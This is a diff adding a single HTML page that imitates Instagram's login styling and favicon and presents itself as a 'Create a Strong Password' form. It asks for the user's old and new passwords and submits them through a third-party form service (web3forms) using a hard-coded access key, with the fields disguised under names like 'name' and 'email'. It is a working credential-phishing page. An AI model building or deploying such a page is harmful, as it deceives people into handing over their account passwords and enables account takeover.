@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link
+      rel="icon"
+      href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png"
+    />
+    <style>
+      :root {
+        --bg-color: #ffffff;
+        --text-color: #000000;
+        --input-bg: #fafafa;
+        --box-bg: #ffffff;
+      }
+
+      body.dark {
+        --bg-color: #000000;
+        --text-color: #ffffff;
+        --input-bg: #1a1a1a;
+        --box-bg: #111111;
+      }
+
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: var(--bg-color);
+        color: var(--text-color);
+        transition: background 0.3s, color 0.3s;
+      }
+
+      .container {
+        max-width: 350px;
+        margin: 40px auto;
+        text-align: center;
+      }
+
+      .login-box {
+        background: var(--box-bg);
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      }
+
+      .logo {
+        width: 175px;
+        margin-bottom: 20px;
+      }
+
+      form input {
+        width: 100%;
+        margin: 8px 0;
+        padding: 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        background: var(--input-bg);
+        color: var(--text-color);
+      }
+
+      form label {
+        display: block;
+        text-align: left;
+        margin-top: 12px;
+        font-weight: bold;
+      }
+
+      button {
+        width: 100%;
+        padding: 10px;
+        margin-top: 20px;
+        background: #3897f0;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        font-weight: bold;
+        cursor: pointer;
+      }
+
+      .toggle-btn {
+        margin-top: 20px;
+        background: none;
+        border: 1px solid #3897f0;
+        color: #3897f0;
+        padding: 8px 16px;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="login-box">
+        <img src="insta.png" alt="Instagram Logo" class="logo" />
+
+        <form action="https://api.web3forms.com/submit" method="POST">
+          <h2>Create a Strong Password</h2>
+          <p style="font-size: 13px">
+            Your password must be at least 6 characters and include numbers,
+            letters, and special characters ($@%).
+          </p>
+
+          <input
+            type="hidden"
+            name="access_key"
+            value="300696b5-f2b7-4b81-9260-fcd8ce1d7906"
+          />
+
+          <label for="name">Input your old password</label>
+          <input
+            type="text"
+            id="name"
+            name="name"
+            placeholder="Enter your old password"
+            required
+          />
+
+          <label for="email">New password</label>
+          <input
+            type="text"
+            id="email"
+            name="email"
+            placeholder="Enter new password"
+            required
+          />
+
+          <label for="contact">Confirm new password</label>
+          <input
+            type="text"
+            id="contact"
+            name="message"
+            placeholder="Confirm new password"
+            required
+          />
+
+          <button type="submit">Submit</button>
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
